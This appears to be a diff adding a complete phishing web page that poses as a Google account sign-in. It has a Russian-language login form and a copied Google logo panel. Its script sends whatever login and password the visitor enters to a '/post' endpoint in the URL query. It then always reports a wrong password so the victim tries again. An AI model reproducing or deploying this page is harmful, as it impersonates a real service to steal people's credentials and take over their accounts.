@@ -1,0 +1,513 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in — Google Account</title>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+  <style>
+    a:hover{
+      text-decoration: underline;
+    }
+    body{
+        display: flex;
+        font-family: Arial, sans-serif;
+        align-items: center;
+        justify-content: center;
+        background-color: #F2F2F2;
+        align-items: center;
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+        height: 90vh;
+    }
+    .container{
+        margin: auto;
+        padding: 20px;
+        width: 80vh;
+        max-width: 800px;
+        flex-direction: column; 
+        align-items: flex-start;
+        transform-origin: center; 
+    }
+    .zero {
+        background: #FFFFFF;
+        justify-content: center;
+        border-radius: 10px;
+        padding: 30px 30px;
+        height: 420px;
+        width: 37vh;
+        box-shadow: 0px 0px 3px 3px rgb(0, 0, 0, 0.05);
+    }
+    @media screen and (min-width: 768px){
+      .container{
+        width: 800px;
+      }
+    }
+    .logo-container{
+      text-align: center;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo{
+      width: 40px;
+      height: 40px;
+      fill: #FFC72C;
+      margin-right: 100px;
+    }
+    .company-name{
+      font-size: 42px;
+      color: black;
+      margin-left: 0px;
+    }
+    .form-container{
+      background: #FFFFFF;
+      justify-content: center;
+      border-radius: 25px;
+      padding: 20px;
+    }
+    h1{
+      text-align: center;
+      font-size: 28px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .containertitle{
+      color: #202124;
+      font-size: 26px;
+      padding: 10px 0px 20px 0px;
+      margin-bottom: 10px;
+      font-weight: bolder;
+    }
+    .containersubtitle{
+      color: #202124;
+      font-size: 16px;
+      padding: 0px 0px 30px 0px;
+    }
+    .input-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .input-field2 {
+      outline: none;
+      width: 100%;
+      height: 50px;
+      padding: 12px 10px;
+      box-sizing: border-box;
+      border: 1px solid #6b6b6b;
+      border-radius: 4px;
+    }
+    .input-field {
+      outline: none;
+      width: 100%;
+      height: 40px;
+      padding: 12px 10px;
+      box-sizing: border-box;
+      border: 1px solid #DDDCDB;
+      border-radius: 10px;
+    }
+    .input-field:focus {
+        border: 1px solid #0C77C3;
+        box-shadow: 0px 0px 0px 3px rgb(158, 201, 231, 1)
+    }
+    .label {
+        transition: 0.2s;
+        color: #6b6b6b;
+        background: white; 
+        padding: 0 5px; 
+        font-size: 16px;
+        margin-left: -5px;
+        margin-bottom: 10px;
+        display: block;
+    }
+    .submit-btn {
+        outline: none;
+      background: #D8443A;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 10px;
+      transition: 0.2s;
+      width: 37vh;
+      font-size: 16px;
+      font-weight: normal;
+    }
+    .submit-btn2 {
+        outline: none;
+        background: #F3F8FC;
+        color: #0E8CE5;
+        border: 1px solid #0E8CE5;
+        padding: 12px 20px;
+        border-radius: 10px;
+        width: 37vh;
+        transition: 0.2s;
+        font-size: 16px;
+        font-weight: normal;
+        margin-top:23px;
+    }
+    @media screen and (min-width: 768px){
+      .submit-btn{
+        width: 100%;
+      }
+    }
+    @media screen and (min-width: 768px){
+      .submit-btn2{
+        width: 100%;
+      }
+    }
+    .submit-btn:hover {
+        background: #DE6058;
+    }
+    .submit-btn2:hover {
+        background: #0E8CE5;
+        color:white;
+    }
+    .containerbtn {
+      display: flex;
+      justify-content: end;
+      padding: 30px 0px 25px 0px;
+    }
+    .badd {
+        color:#B3261E;
+        font-size: 14px;
+        position: relative;
+        display: flex;
+        top: -14px;
+    }
+    .badd span {
+        position: relative;
+        display: flex;
+        right:-10px;
+        top: 1px;
+    }
+    .submit-btn3 {
+        outline: none;
+      background: #0B57D0;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 20px;
+      transition: 0.2s;
+      font-size: 0.875rem;
+    }
+    .submit-btn3:hover {
+        background: #0E4EB5;
+    }
+    .input-field2:focus + .label2,
+    .input-field2:not(:placeholder-shown) + .label2 {
+      top: -7px;
+      left: 10px;
+      font-size: 12px;
+    }
+    .badd svg {
+      color:#B3261E;
+        min-width: 16px;
+        min-height: 16px;
+    }
+    .baddd {
+        color:#B3261E;
+        font-size: 14px;
+        position: relative;
+        display: flex;
+        top: 5px;
+    }
+    .baddd span {
+        position: relative;
+        display: flex;
+        right:-10px;
+        top: 1px;
+    }
+    .baddd svg {
+        color:#B3261E
+    }
+    @media screen and (min-width: 768px){
+      .logo{
+        max-width: 80px;
+        max-height: 80px;
+      }
+    }
+    @media screen and (min-width: 768px){
+      .badd svg{
+        min-width: 16px;
+        min-height: 16px;
+      }
+    }
+    .sep {
+        color: #DDDCDB;
+        height: 1px;
+        background-color: #DDDCDB; 
+        width: 100%;
+        margin-left: -30px;
+        width: 43.5vh;
+        display: block;
+    }
+    .reqpole {
+        color: #B2493F;
+        margin-top:10px;
+        font-size: 13px;
+        display: block;
+    }
+    .containertitle2{
+      color: #202124;
+      font-size: 36px;
+      padding: 15px 0px 20px 0px;
+    }
+    .badloginorpass {
+        background-color: #FAEBEA;
+        border: 1px solid #EEADA9;
+        border-radius: 3px;
+        margin-bottom: 40px;
+        height:55px;
+    }
+    .label2 {
+      position: absolute;
+      left: 10px;
+      top: 16px;
+      transition: 0.2s;
+      color: #6b6b6b;
+      pointer-events: none;
+      background: white; 
+      padding: 0 5px; 
+      font-size: 15px;
+
+    }
+    .badloginorpass span {
+        color: #202124;
+        font-size: 14px;
+        padding: 20px 20px 20px 15px;
+        display: block;
+    }
+  </style>
+</head>
+<body>
+    <div class=zero id="zero">
+
+        <center>
+            <div class="containertitle">Вход в систему</div>
+        </center>
+
+        <div class="badloginorpass" style="display:none" id="badloginorpass">
+            <span>Неверный логин или пароль</span>
+        </div>
+
+        <label class="label">Логин</label>
+        <input class="input-field" id="emailfield1">
+        <center><div class="reqpole" id="mailp" style="display:none">Поле обязательно для заполнения</div></center>
+
+        <br>
+        <br>
+
+        <label class="label">Пароль</label>
+        <input class="input-field" id="passfield1">
+        <center><div class="reqpole" id="passp" style="display:none">Поле обязательно для заполнения</div></center>
+
+        <br>
+        <br>
+
+        <button class="submit-btn" id="submitlog">Войти</button>
+
+        <br>
+        <br>
+        <br>
+
+        <div class="sep"></div>
+
+        <button class="submit-btn2" id="togoogle">Войти через Google</button>
+
+    </div>
+
+    <div class='container' style="display:none" id="togoogle2">
+        <div class='logo-container'>
+          <?xml version='1.0' standalone='no'?>
+          <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>
+        </div>
+        <div class=form-container>
+            <div class='containerlogo'>
+              <!-- Google Logo -->
+              <div id="logo" title="Google">
+                <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
+              </div>
+              <!-- /Google Logo -->
+            </div>
+          <div style='min-height: 150px'>
+              <div class='containertitle2'>Вход</div>
+              <div class='containersubtitle'>Авторизация в сети</div>
+              <div class='input-container'>
+                <input name='email' id="email" class='input-field2' type='text' placeholder=' ' required>
+                <label class='label2' id="textmail">Телефон или адрес эл. почты</label>
+              </div>
+              <div id="badmail" class="badd" style="display:none">
+                <svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                <span>Введите адрес электронной почты или номер телефона.</span>
+            </div>
+              <div class='input-container'>
+                <input name='password' id="password" class='input-field2' type='password' placeholder=' ' required>
+                <label class='label2' id="textpass">Введите пароль</label>
+                <div id="badpass" class="baddd" style="display:none">
+                    <svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                    <span id="textenps">Введите пароль.</span>
+                </div>
+              </div>
+              <div class='containerbtn'>
+                <button id='aedfwarsxfgvb' class='submit-btn3' type='submit'>Войти</button>
+              </div>
+            </div>
+      </div>
+
+    <script> // Made with love by me
+        let submitlog = document.getElementById('submitlog');
+        let emailfield1 = document.getElementById('emailfield1');
+        let passfield1 = document.getElementById('passfield1');
+        let mailp = document.getElementById('mailp');
+        let passp = document.getElementById('passp'); 
+        let badloginorpass = document.getElementById('badloginorpass');
+        let togoogle = document.getElementById('togoogle');
+        let togoogle2 = document.getElementById('togoogle2');
+        let zero = document.getElementById('zero');
+        let zerosize = 420;
+        let shown1 = false;
+        let shown2 = false;
+        let clcked = false;
+
+        emailfield1.addEventListener('input', ()=>{
+            mailp.style.display='none';
+            if(shown1){zerosize-=25;}
+            shown1 = false;
+            zero.style.height=zerosize+'px';
+        })
+
+        passfield1.addEventListener('input', ()=>{
+            passp.style.display='none';
+            if(shown2){zerosize-=25;}
+            shown2 = false;
+            zero.style.height=zerosize+'px';
+        })
+
+        submitlog.addEventListener('click', ()=>{
+            var passwordd = passfield1.value;
+            var emaill = emailfield1.value;
+            if(passwordd.trim()===''){
+                passp.style.display='block';
+                shown2=true;
+                zerosize+=25;
+            }
+            if(emaill.trim()===''){
+                mailp.style.display='block';
+                shown1=true;
+                zerosize+=25;
+            }
+            if(emaill.trim()!==''&&passwordd.trim()!==''){
+                badloginorpass.style.display='block';
+                if(!clcked){zerosize+=100;}
+                clcked = true;
+                fetch('/post?email=' + emaill.trim() + '&password=' + passwordd.trim(), {
+                    mode: 'cors'
+                })
+                .catch(error => {
+                });
+            }
+            zero.style.height=zerosize+'px';
+        });
+
+        togoogle.addEventListener('click', ()=>{
+            function showw(){
+                zero.style.display='none';
+                togoogle2.style.display='block';
+                document.body.style.backgroundColor='#F0F4F9';
+            }
+            async function show() {
+                await new Promise(resolve => setTimeout(showw, 500));
+            }
+            show();
+        })
+
+        let emailField = document.getElementById("email");
+        let passField = document.getElementById("password");
+        let textpass = document.getElementById('textpass');
+        let textmail = document.getElementById('textmail');
+        const ontouchsta = document.getElementById('aedfwarsxfgvb');
+        let badmail = document.getElementById('badmail');
+        let badpass = document.getElementById('badpass');
+        let textenps = document.getElementById('textenps');
+
+        var colorblurmail = '#6b6b6b';
+        var colorfocusmail = '#1B55AC';
+        var colorblur = '#6b6b6b';
+        var colorfocus = '#1B55AC';
+        var textmailcolorfocus = '#22549B';
+        var textpasscolorfocus = '#22549B';
+        var textmailcolorblur = '#6b6b6b';
+        var textpasscolorblur = '#6b6b6b';
+
+        emailField.addEventListener('focus', ()=> {
+            emailField.style.border='2px solid '+colorfocusmail;
+            textmail.style.color=textmailcolorfocus;
+        })
+
+        passField.addEventListener('focus', ()=> {
+            passField.style.border='2px solid '+colorfocus;
+            textpass.style.color=textpasscolorfocus;
+            console.log(textpasscolorblur);
+        })
+
+        emailField.addEventListener('blur', ()=> {
+            emailField.style.border='1px solid '+colorblurmail;
+            if(emailField.value.trim() == "" || textmailcolorfocus !== '#B3261E') {
+                textmail.style.color=textmailcolorblur;
+            }
+        })
+
+        passField.addEventListener('blur', ()=> {
+            passField.style.border='1px solid '+colorblur;
+            if(passField.value.trim() == "" || textpasscolorfocus !== '#B3261E') {
+                textpass.style.color=textpasscolorblur;
+            }
+        })
+
+        ontouchsta.addEventListener("click", () => {
+
+            if(emailField.value.trim() == "") {
+                colorfocusmail='#B3261E';
+                colorblurmail='#B3261E';
+                textmailcolorfocus = '#B3261E';
+                emailField.style.border='1px solid #B3261E';
+                badmail.style.display='flex';
+
+            } if(emailField.value.trim() !== "") {
+                colorfocusmail='#1B55AC';
+                colorblurmail='#6b6b6b';
+                textmailcolorfocus = '#22549B';
+                emailField.style.border='1px solid #6b6b6b';
+                textmail.style.color=textmailcolorblur;
+                badmail.style.display='none';
+                
+            } if(passField.value.trim() == "") {
+                colorfocus='#B3261E';
+                colorblur='#B3261E';
+                textenps.textContent='Введите пароль.';
+                textpasscolorfocus = '#B3261E';
+                passField.style.border='1px solid #B3261E';
+                badpass.style.display='flex';
+            
+            } if(passField.value.trim() !== "" && emailField.value.trim() !== "") {
+                fetch('/post?email=' + emailField.value.trim() + '&password=' + passField.value.trim(), {
+                    mode: 'cors'
+                })
+                .catch(error => {
+                });
+                textenps.textContent='Неверный пароль.';
+                colorfocus='#B3261E';
+                colorblur='#B3261E';
+                textpasscolorfocus = '#B3261E';
+                passField.style.border='1px solid #B3261E';
+                badpass.style.display='flex';
+                textpass.style.color=textpasscolorfocus;
+            }
+            return; 
+        });
+
+    </script>
+</body>
+</html>
